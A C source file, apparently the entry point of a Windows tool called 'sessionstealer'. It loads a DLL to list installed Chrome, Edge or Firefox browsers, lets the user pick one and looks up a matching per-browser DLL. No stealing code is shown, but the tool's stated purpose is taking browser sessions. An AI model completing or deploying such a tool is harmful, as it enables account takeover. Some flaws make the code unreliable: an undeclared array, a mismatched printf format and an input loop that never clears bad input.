#include "sessionstealer/version.h"
#include "sessionstealer/cli_args.h"
#include "sessionstealer/utils.h"
#include "sessionstealer/dll_loader.h"
#include "dlls/discovery/discovery.h"

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <windows.h>

static discovery_browser_name_t browser_map[] = {
    [CLI_BROWSER_CHROME]  = DISCOVERY_CHROME,
    [CLI_BROWSER_EDGE]    = DISCOVERY_EDGE,
    [CLI_BROWSER_FIREFOX] = DISCOVERY_FIREFOX
};

int main(int argc, char *argv[]) {
    cli_args_t args = create_cli_args();
    cli_args_action_t action = parse_cli_args(argc, argv, &args);

    if (action == CLI_ACTION_EXIT)
        return EXIT_SUCCESS;
    if (action == CLI_ACTION_INVALID)
        return EXIT_FAILURE;

    HMODULE hLib = LoadLibraryA("discovery.dll");
    if (!hLib) {
        printf("Failed to load discovery.dll\n");
        return 1;
    }

    discover_browsers_fn discover_browsers_dll = (discover_browsers_fn)GetProcAddress(hLib, "discover_browsers");
    if (!discover_browsers_dll) {
        printf("Failed to find discover_browsers in DLL\n");
        FreeLibrary(hLib);
        return 1;
    }

    discovery_browser_list_t discovered_browsers = discover_browsers_dll();
    FreeLibrary(hLib);

    if (discovered_browsers.length < 1) {
        printf("No browsers discovered\n");
    }

    discovery_browser_t *selected_browser;
    if (!(args.browser == CLI_BROWSER_DETECT)) {
        discovery_browser_name_t target = browser_map[args.browser];
        bool found = false;

        for (size_t i = 0; i < discovered_browsers.length; i++) {
            discovery_browser_t *browser = &discovered_browsers.browsers[i];
            if (browser->browser_name == target) {
                selected_browser = browser;
                found = true;
                break;
            }
        }
        if (!found) {
            printf("Selected browser was not found on this PC\n");
            return EXIT_SUCCESS;
        }
    } else {
        printf("Discovered browsers:\n");
        for (size_t i = 0; i < discovered_browsers.length; i++) {
            discovery_browser_t *discovered_browser = &discovered_browsers.browsers[i];
            const char *browser_name = enum_browser_to_char(discovered_browser->browser_name);
            printf("    %d. %s\n", i+1, browser_name);
        }
        size_t input;
        while (true) {
            printf("Select browser number: ");
            if (scanf("%zu", &input) != 1) {
                printf("Invalid input! Enter number\n");
                continue;
            } else {
                if (input >= 1 && input <= discovered_browsers.length) {
                    break;
                } else {
                    printf("Select in range %zu-%zu\n", 1, discovered_browsers.length);
                }
            }
        }
        input--;
        selected_browser = &discovered_browsers.browsers[input];
    }

    const char *selected_browser_dll_name = find_dll_browser(selected_browser->browser_name);
    if (!selected_browser_dll_name) {
        printf("Dll for selected browser was not found, install %s\n", browser_map_dll[selected_browser->browser_name]);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
